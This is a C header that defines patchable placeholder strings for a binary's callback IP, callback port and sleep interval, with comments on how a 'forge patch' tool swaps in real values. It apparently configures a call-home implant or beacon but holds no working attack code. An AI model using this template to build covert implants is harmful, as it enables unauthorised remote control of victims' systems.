#ifndef CONFIG_H
#define CONFIG_H

/*
 * Patch sentinels — these values are compiled into the binary as-is.
 * Use `forge patch` to replace them with real values before deployment.
 *
 * Rules:
 *   - Each sentinel must appear exactly once in the compiled binary.
 *   - Sentinel strings must match the `sentinel` field in forge.toml.
 *   - Buffers must be large enough for the sentinel AND the replacement value.
 */

#define CALLBACK_IP   "AAAA_CALLBACK_IP_AAAA"
#define CALLBACK_PORT "BBBB_CALLBACK_PORT_BBBB"
#define SLEEP_SECONDS "CCCC_SLEEP_SECS_CCCC"

#endif /* CONFIG_H */
